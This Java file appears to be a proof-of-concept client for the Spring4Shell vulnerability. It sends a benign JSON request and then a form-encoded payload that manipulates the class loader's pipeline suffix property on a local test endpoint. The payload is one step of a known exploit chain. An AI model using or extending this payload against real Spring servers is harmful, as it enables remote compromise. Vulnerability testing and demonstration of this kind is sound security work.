package com.github.marschall.spring4shell.client;

import java.net.URI;

import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.http.RequestEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

public class Spring4ShellClient {

  public static void main(String[] args) {
    String host = "http://localhost:8080/";
    String context = "spring4shell";
    String servlet = "poc";
    String endpoint = "model";
    URI baseUri = URI.create(host + context + "/" + servlet + "/" + endpoint);
    RestTemplate restTemplate = new RestTemplate();

    RequestEntity<String> jsonEntity = newJsonEntity(baseUri);
    ResponseEntity<Void> jsonResponse = restTemplate.exchange(jsonEntity, Void.class);
    System.out.println(jsonResponse.getStatusCodeValue());

    RequestEntity<String> payloadEntity = newPayloadEntity(baseUri);
    ResponseEntity<Void> payloadResponse = restTemplate.exchange(payloadEntity, Void.class);
    System.out.println(payloadResponse.getStatusCodeValue());
  }

  private static RequestEntity<String> newJsonEntity(URI baseUri) {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.APPLICATION_JSON);
    return new RequestEntity<>("{\"name\": \"safe\"}", httpHeaders, HttpMethod.POST, baseUri);
  }

  private static RequestEntity<String> newPayloadEntity(URI baseUri) {
    HttpHeaders httpHeaders = new HttpHeaders();
    httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
    String payload = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp";
    return new RequestEntity<>(payload, httpHeaders, HttpMethod.POST, baseUri);
  }

}
